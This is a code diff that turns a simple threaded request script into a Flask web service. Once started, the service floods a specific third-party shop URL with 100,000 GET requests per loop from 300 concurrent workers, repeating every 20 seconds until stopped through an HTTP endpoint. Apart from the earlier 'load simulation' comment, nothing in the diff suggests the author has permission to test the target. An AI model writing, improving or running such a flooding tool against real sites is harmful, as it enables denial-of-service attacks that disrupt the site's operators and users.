@@ -1,28 +1,65 @@
-import threading
-import time
-import requests
-import random
+from flask import Flask, jsonify, request, send_from_directory
+from threading import Thread
+from concurrent.futures import ThreadPoolExecutor
+import requests, time, random, os
 
-target_url = "https://www.snakaranavi.net/shop.php?sno=18710"  # Change this
-virtual_multiplier = 100
-visible_requests = 10
-delay_range = (0.01, 0.03)
+app = Flask(__name__, static_folder='static')
 
-def send_virtual_request():
-    try:
-        requests.get(target_url, timeout=5)
-    except Exception:
-        pass
+running = False
+loop_count = 0
+total_sent = 0
 
-def send_batch(batch_number):
-    print(f"🔄 Sending batch #{batch_number + 1}")
-    for _ in range(virtual_multiplier):
-        threading.Thread(target=send_virtual_request).start()
-        time.sleep(random.uniform(*delay_range))
+target_url = "https://www.snakaranavi.net/shop.php?sno=18710"
+max_workers = 300
+requests_per_loop = 100000
+delay_range = (0.001, 0.005)
 
-print(f"🚀 Starting simulated load on {target_url}")
-for i in range(visible_requests):
-    threading.Thread(target=send_batch, args=(i,)).start()
-    time.sleep(0.5)
+def send_loop():
+    global loop_count, total_sent, running
+    while running:
+        loop_count += 1
+        print(f"🚀 Loop {loop_count} started")
 
-print("✅ Load simulation started.")
+        def send():
+            try:
+                requests.get(target_url, timeout=5)
+            except:
+                pass
+            time.sleep(random.uniform(*delay_range))
+
+        with ThreadPoolExecutor(max_workers=max_workers) as executor:
+            executor.map(lambda _: send(), range(requests_per_loop))
+        
+        total_sent += requests_per_loop
+        time.sleep(20)
+
+@app.route('/')
+def index():
+    return send_from_directory(app.static_folder, 'index.html')
+
+@app.route('/start', methods=['POST'])
+def start():
+    global running
+    if not running:
+        running = True
+        Thread(target=send_loop).start()
+        return jsonify({"status": "started"})
+    return jsonify({"status": "already running"})
+
+@app.route('/stop', methods=['POST'])
+def stop():
+    global running
+    running = False
+    return jsonify({"status": "stopped"})
+
+@app.route('/status')
+def status():
+    return jsonify({
+        "running": running,
+        "loop_count": loop_count,
+        "total_sent": total_sent
+    })
+
+if __name__ == '__main__':
+    port = int(os.environ.get("PORT", 8080))
+    app.run(host="0.0.0.0", port=port)
